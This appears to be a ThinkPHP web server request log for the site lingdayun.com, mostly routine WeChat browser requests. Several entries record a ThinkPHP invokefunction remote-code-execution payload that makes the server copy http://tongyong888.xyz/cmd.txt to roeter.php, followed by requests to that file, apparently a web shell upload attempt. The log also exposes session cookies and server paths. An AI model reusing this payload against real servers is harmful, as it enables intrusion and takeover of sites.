+[ info ] [ PARAM ] array (
+)
+[ info ] [ RUN ] app\index\controller\Api->tankuang[ C:\wwwroot\www.lingdayun.com\application\index\controller\Api.php ]
+[ info ] [ DB ] INIT mysql
+[ info ] [ LOG ] INIT File
+[ sql ] [ DB ] CONNECT:[ UseTime:0.011935s ] mysql:dbname=www_lingdayun_co;host=127.0.0.1;port=3306;charset=utf8
+[ sql ] [ SQL ] SHOW COLUMNS FROM `ld_wx_user` [ RunTime:0.003351s ]
+[ sql ] [ SQL ] SELECT * FROM `ld_wx_user` WHERE  `user_openid` = null LIMIT 1 [ RunTime:0.000377s ]
+
+---------------------------------------------------------------
+[ 2022-12-08T21:11:49+08:00 ] 10.0.8.4 101.23.151.21 GET /static/js/layer/layer.js
+[ log ] www.lingdayun.com/static/js/layer/layer.js [运行时间：0.069677s][吞吐率：14.35req/s] [内存消耗：1,113.90kb] [文件加载：40]
+[ info ] [ LANG ] C:\wwwroot\www.lingdayun.com\thinkphp\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'static',
+    1 => 'js',
+    2 => 'layer',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'cookie' => 'ZDEDebuggerPresent=php,phtml,php3; PHPSESSID=jfs161jjr7rmqrji8etj2510s4',
+  'accept-language' => 'zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7',
+  'accept-encoding' => 'gzip, deflate',
+  'referer' => 'http://www.lingdayun.com/html/shequ_wode.html',
+  'x-requested-with' => 'com.tencent.mm',
+  'accept' => '*/*',
+  'user-agent' => 'Mozilla/5.0 (Linux; Android 10; JER-AN10 Build/HUAWEIJER-AN10; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.99 XWEB/4365 MMWEBSDK/20221012 Mobile Safari/537.36 MMWEBID/7980 MicroMessenger/8.0.30.2260(0x28001E55) WeChat/arm64 Weixin NetType/WIFI Language/zh_CN ABI/arm64',
+  'connection' => 'close',
+  'host' => 'www.lingdayun.com',
+)
+[ info ] [ PARAM ] array (
+  '/static/js/layer/layer_js' => '',
+)
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2022-12-08T21:11:49+08:00 ] 10.0.8.4 101.23.151.21 GET /index.php/api/base/check_login
+[ log ] www.lingdayun.com/index.php/api/base/check_login [运行时间：0.080767s][吞吐率：12.38req/s] [内存消耗：1,335.55kb] [文件加载：45]
+[ info ] [ LANG ] C:\wwwroot\www.lingdayun.com\thinkphp\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'api',
+    1 => 'base',
+    2 => 'check_login',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'cookie' => 'ZDEDebuggerPresent=php,phtml,php3; PHPSESSID=jfs161jjr7rmqrji8etj2510s4',
+  'accept-language' => 'zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7',
+  'accept-encoding' => 'gzip, deflate',
+  'referer' => 'http://www.lingdayun.com/html/shequ_wode.html',
+  'x-requested-with' => 'XMLHttpRequest',
+  'user-agent' => 'Mozilla/5.0 (Linux; Android 10; JER-AN10 Build/HUAWEIJER-AN10; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.99 XWEB/4365 MMWEBSDK/20221012 Mobile Safari/537.36 MMWEBID/7980 MicroMessenger/8.0.30.2260(0x28001E55) WeChat/arm64 Weixin NetType/WIFI Language/zh_CN ABI/arm64',
+  'accept' => 'application/json, text/javascript, */*; q=0.01',
+  'connection' => 'close',
+  'host' => 'www.lingdayun.com',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ RUN ] app\api\controller\Base->check_login[ C:\wwwroot\www.lingdayun.com\application\api\controller\Base.php ]
+[ info ] [ SESSION ] INIT array (
+  'id' => '',
+  'var_session_id' => '',
+  'prefix' => 'think',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2022-12-08T21:14:12+08:00 ] 10.0.8.4 180.163.30.27 GET /static/js/layer/layer.js
+[ log ] www.lingdayun.com/static/js/layer/layer.js [运行时间：0.068575s][吞吐率：14.58req/s] [内存消耗：1,112.91kb] [文件加载：40]
+[ info ] [ LANG ] C:\wwwroot\www.lingdayun.com\thinkphp\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'static',
+    1 => 'js',
+    2 => 'layer',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'connection' => 'close',
+  'host' => 'www.lingdayun.com',
+  'accept-language' => 'zh-CN,zh;q=0.8,en-US;q=0.6,en;q=0.4',
+  'referer' => 'http://www.lingdayun.com/html/shequ_wode.html',
+  'accept' => '*/*',
+  'user-agent' => 'Mozilla/5.0 (Linux; Android 5.1.1; SM801 Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043024 Safari/537.36 MicroMessenger/6.5.4.1000 NetType/4G Language/zh_CN',
+)
+[ info ] [ PARAM ] array (
+  '/static/js/layer/layer_js' => '',
+)
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2022-12-08T21:26:56+08:00 ] 10.0.8.4 223.247.178.167 GET /
+[ log ] lingdayun.com/ [运行时间：0.083822s][吞吐率：11.93req/s] [内存消耗：1,276.23kb] [文件加载：44]
+[ info ] [ LANG ] C:\wwwroot\www.lingdayun.com\thinkphp\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'connection' => 'close',
+  'accept-encoding' => 'gzip',
+  'accept-language' => 'zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7',
+  'user-agent' => 'Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1',
+  'host' => 'lingdayun.com',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ RUN ] app\index\controller\Index->index[ C:\wwwroot\www.lingdayun.com\application\index\controller\Index.php ]
+[ info ] [ VIEW ] C:\wwwroot\www.lingdayun.com\public/../application/index\view\index\index.html [ array (
+) ]
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2022-12-08T21:43:09+08:00 ] 10.0.8.4 43.248.96.186 GET /?s=/Home/%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars%5B0%5D=copy&vars%5B1%5D%5B%5D=http://tongyong888.xyz/cmd.txt&vars%5B1%5D%5B%5D=roeter.php
+[ log ] lingdayun.com/?s=/Home/%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars%5B0%5D=copy&vars%5B1%5D%5B%5D=http://tongyong888.xyz/cmd.txt&vars%5B1%5D%5B%5D=roeter.php [运行时间：0.089695s][吞吐率：11.15req/s] [内存消耗：1,112.65kb] [文件加载：40]
+[ info ] [ LANG ] C:\wwwroot\www.lingdayun.com\thinkphp\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'Home',
+    1 => '\\think\\app',
+    2 => 'invokefunction',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'connection' => 'close',
+  'accept' => '*/*',
+  'accept-encoding' => 'gzip, deflate',
+  'user-agent' => 'python-requests/2.27.1',
+  'host' => 'lingdayun.com',
+)
+[ info ] [ PARAM ] array (
+  'function' => 'call_user_func_array',
+  'vars' => 
+  array (
+    0 => 'copy',
+    1 => 
+    array (
+      0 => 'http://tongyong888.xyz/cmd.txt',
+      1 => 'roeter.php',
+    ),
+  ),
+)
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2022-12-08T21:43:09+08:00 ] 10.0.8.4 43.248.96.186 GET /roeter.php
+[ log ] lingdayun.com/roeter.php [运行时间：0.068738s][吞吐率：14.55req/s] [内存消耗：1,112.14kb] [文件加载：40]
+[ info ] [ LANG ] C:\wwwroot\www.lingdayun.com\thinkphp\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'roeter.php',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'connection' => 'close',
+  'accept' => '*/*',
+  'accept-encoding' => 'gzip, deflate',
+  'user-agent' => 'python-requests/2.27.1',
+  'host' => 'lingdayun.com',
+)
+[ info ] [ PARAM ] array (
+  '/roeter_php' => '',
+)
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2022-12-08T21:44:57+08:00 ] 10.0.8.4 59.83.208.103 GET /roeter.php
+[ log ] lingdayun.com/roeter.php [运行时间：0.069006s][吞吐率：14.49req/s] [内存消耗：1,113.01kb] [文件加载：40]
+[ info ] [ LANG ] C:\wwwroot\www.lingdayun.com\thinkphp\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'roeter.php',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'upgrade-insecure-requests' => '1',
+  'connection' => 'close',
+  'cache-control' => 'max-age=0',
+  'accept-language' => 'zh-CN,zh;q=0.9',
+  'accept-encoding' => 'gzip, deflate',
+  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
+  'user-agent' => 'python-requests/2.27.1',
+  'host' => 'lingdayun.com',
+)
+[ info ] [ PARAM ] array (
+  '/roeter_php' => '',
+)
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2022-12-08T22:16:13+08:00 ] 10.0.8.4 43.248.96.186 GET /?s=/Index/%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars%5B0%5D=copy&vars%5B1%5D%5B%5D=http://tongyong888.xyz/cmd.txt&vars%5B1%5D%5B%5D=roeter.php
+[ log ] lingdayun.com/?s=/Index/%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars%5B0%5D=copy&vars%5B1%5D%5B%5D=http://tongyong888.xyz/cmd.txt&vars%5B1%5D%5B%5D=roeter.php [运行时间：0.082288s][吞吐率：12.15req/s] [内存消耗：1,113.38kb] [文件加载：40]
+[ info ] [ LANG ] C:\wwwroot\www.lingdayun.com\thinkphp\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'Index',
+    1 => '\\think\\app',
+    2 => 'invokefunction',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'connection' => 'close',
+  'accept' => '*/*',
+  'accept-encoding' => 'gzip, deflate',
+  'user-agent' => 'python-requests/2.27.1',
+  'host' => 'lingdayun.com',
+)
+[ info ] [ PARAM ] array (
+  'function' => 'call_user_func_array',
+  'vars' => 
+  array (
+    0 => 'copy',
+    1 => 
+    array (
+      0 => 'http://tongyong888.xyz/cmd.txt',
+      1 => 'roeter.php',
+    ),
+  ),
+)
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2022-12-08T22:16:13+08:00 ] 10.0.8.4 43.248.96.186 GET /roeter.php
+[ log ] lingdayun.com/roeter.php [运行时间：0.064488s][吞吐率：15.51req/s] [内存消耗：1,112.14kb] [文件加载：40]
+[ info ] [ LANG ] C:\wwwroot\www.lingdayun.com\thinkphp\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'roeter.php',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'connection' => 'close',
+  'accept' => '*/*',
+  'accept-encoding' => 'gzip, deflate',
+  'user-agent' => 'python-requests/2.27.1',
+  'host' => 'lingdayun.com',
+)
+[ info ] [ PARAM ] array (
+  '/roeter_php' => '',
+)
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
